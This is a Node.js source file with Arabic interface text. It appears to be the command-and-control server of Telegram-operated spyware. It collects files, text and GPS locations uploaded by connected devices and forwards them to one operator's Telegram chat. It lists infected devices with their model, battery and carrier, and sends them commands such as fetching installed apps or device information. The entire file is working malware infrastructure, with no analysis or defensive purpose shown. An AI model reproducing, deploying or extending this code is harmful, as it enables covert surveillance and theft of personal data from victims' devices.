require('dotenv').config();
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = process.env.TG_TOKEN;
const id = process.env.TG_ID;
const AGENT_SECRET = process.env.AGENT_SECRET || 'default_secret';
const address = process.env.KEEP_ALIVE_URL || 'https://google.com';

if (!token || !id) { console.error('❌ TG_TOKEN مفقود'); process.exit(1); }

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());

app.get('/health', (req, res) => res.status(200).send('OK'));
app.get('/', (req, res) => res.send('<h1>Service Online</h1>'));

app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• ملف من <b>${req.headers.model || '?'}</b>`,
        parse_mode: 'HTML'
    }, { filename: req.file.originalname }).catch(() => {});
    res.send('');
});

app.post('/uploadText', (req, res) => {
    appBot.sendMessage(id,
        `°• نص من <b>${req.headers.model || '?'}</b>\n\n${req.body.text || ''}`,
        { parse_mode: 'HTML' }
    ).catch(() => {});
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon).catch(() => {});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const authKey = req.headers['x-agent-key'];
    if (AGENT_SECRET !== 'default_secret' && authKey !== AGENT_SECRET) {
        ws.close(1008, 'Unauthorized'); return;
    }
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const provider = req.headers.provider || 'N/A';
    ws.uuid = uuid;
    ws.isAlive = true;
    appClients.set(uuid, { model, battery, version, provider });
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• الموديل : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• النظام : <b>${version}</b>\n` +
        `• المزود : <b>${provider}</b>\n` +
        `• ID : <code>${uuid}</code>`,
        { parse_mode: 'HTML' }
    ).catch(() => {});
    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id, `°• قطع الاتصال\n• ${model}`, { parse_mode: 'HTML' }).catch(() => {});
    });
    ws.on('error', (e) => console.error('WS:', e.message));
});

const kbMain = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
        resize_keyboard: true
    }
};

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId.toString() !== id.toString()) {
        appBot.sendMessage(id, `°• طلب مرفوض من: ${chatId}`).catch(() => {});
        return;
    }
    if (message.text === '/start') {
        appBot.sendMessage(id, '°• مرحبا بك\n• اختر من الأزرار', kbMain);
    }
    if (message.text === 'الاجهزة المتصلة') {
        if (appClients.size === 0) return appBot.sendMessage(id, '°• لا توجد اجهزة');
        let t = '°• الاجهزة:\n\n';
        appClients.forEach((v, k) => {
            t += `• ID: <code>${k}</code>\n• ${v.model}\n• ${v.battery}\n\n`;
        });
        appBot.sendMessage(id, t, { parse_mode: 'HTML' });
    }
    if (message.text === 'تنفيذ الامر') {
        if (appClients.size === 0) return appBot.sendMessage(id, '°• لا توجد اجهزة');
        const kb = [];
        appClients.forEach((v, k) => {
            kb.push([{ text: `${v.model} | ${k.slice(0,8)}`, callback_data: `device:${k}` }]);
        });
        appBot.sendMessage(id, '°• حدد الجهاز', { reply_markup: { inline_keyboard: kb } });
    }
});

appBot.on('callback_query', (cb) => {
    const msg = cb.message;
    const [cmd, uuid] = cb.data.split(':');
    if (cmd === 'device') {
        const c = appClients.get(uuid);
        if (!c) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
        appBot.editMessageText(`°• الأمر للجهاز : <b>${c.model}</b>`, {
            chat_id: id, message_id: msg.message_id, parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [
                [{ text: 'التطبيقات', callback_data: `apps:${uuid}` },
                 { text: 'معلومات', callback_data: `device_info:${uuid}` }]
            ]}
        });
        return;
    }
    const instant = ['apps', 'device_info'];
    if (instant.includes(cmd)) {
        appSocket.clients.forEach((ws) => {
            if (ws.uuid === uuid) ws.send(cmd);
        });
        appBot.deleteMessage(id, msg.message_id).catch(() => {});
    }
});

setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        try { ws.ping(); } catch (e) {}
    });
}, 30000);

setInterval(() => { axios.get(address).catch(() => {}); }, 10 * 60 * 1000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ Server on ${PORT}`));
process.on('uncaughtException', (e) => console.error('Uncaught:', e.message));
process.on('unhandledRejection', (e) => console.error('Unhandled:', e.message));
